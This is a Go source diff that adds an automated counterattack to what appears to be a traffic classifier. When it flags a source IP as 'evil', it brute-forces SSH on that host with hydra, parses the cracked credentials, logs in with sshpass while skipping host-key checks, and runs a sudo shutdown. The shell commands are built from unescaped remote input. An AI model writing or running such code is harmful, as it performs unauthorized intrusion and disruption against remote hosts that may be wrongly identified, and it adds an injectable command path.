@@ -15,6 +15,7 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"regexp"
 	"strings"
 
 	"gopkg.in/yaml.v2"
@@ -176,12 +177,24 @@ func main() {
 							return
 						}
 						fmt.Println("Evil SourceIP: ", ip)
-						cmd := exec.Command("sh", "-c", "hydra -l ubuntu -P password.lst "+ip+" ssh > tmp")
+						cmd := exec.Command("sh", "-c", "hydra -l ubuntu -P password.lst "+ip+" ssh")
 						output, err := cmd.Output()
 						if err != nil {
 							fmt.Println(err)
 						}
 						fmt.Println(string(output))
+						re := regexp.MustCompile(`login: (\S+).*password: (\S+)`)
+						matches := re.FindStringSubmatch(string(output))
+						if len(matches) > 0 {
+							fmt.Println("Login: ", matches[1])
+							fmt.Println("Password: ", matches[2])
+							cmd = exec.Command("sh", "-c", "sshpass -p "+matches[2]+" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -l "+matches[1]+" "+ip+" sh -c 'ls && echo 1q2w3e4r | sudo -S shutdown -h now'")
+							output, err = cmd.Output()
+							if err != nil {
+								fmt.Println(err)
+							}
+							fmt.Println(string(output))
+						}
 						return
 					} else {
 						fmt.Println("良性通信")
